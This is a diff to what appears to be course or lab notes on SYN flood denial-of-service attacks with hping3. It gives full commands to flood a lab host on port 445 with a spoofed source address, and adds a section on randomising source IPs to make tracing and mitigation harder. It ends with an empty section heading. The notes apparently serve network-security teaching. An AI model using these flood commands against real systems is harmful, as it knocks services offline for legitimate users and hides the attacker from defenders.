@@ -8,9 +8,9 @@
 `hping3` can be used to perform DoS SYN flood attack \
 A SYN flood (half-open attack) is a type of denial-of-service (DDoS) attack which aims to make a server unavailable to legitimate traffic by consuming all available server resources. By repeatedly sending initial connection request (SYN) packets
 
---
+--- 
 
-1- Perform a DoS Attack
+### 1- Perform a DoS Attack
 `sudo hping3 -S 192.168.70.6 -p 445 -a 192.168.70.8 --flood`
 
 - `-S` send SYN packets
@@ -28,7 +28,17 @@ hping in flood mode, no replies will be shown
 3434550 packets transmitted, 0 packets received, 100% packet loss
 round-trip min/avg/max = 0.0/0.0/0.0 ms
 ```
+---
+### 2- Perform a Random Source SYN Flood
 
+`sudo hping3 -S 192.168.70.6 -p 445 --rand-source -a 192.168.70.8 --flood`
+
+Instead of spoofing a single IP address, we can randomize the source IP for every packet to make mitigation and tracing significantly harder.
+
+- `--rand-source` generates a random source IP address for each packet sent.
+---
+
+### 3- 
 
 ---
 > For more questions email: nagy@aast.edu
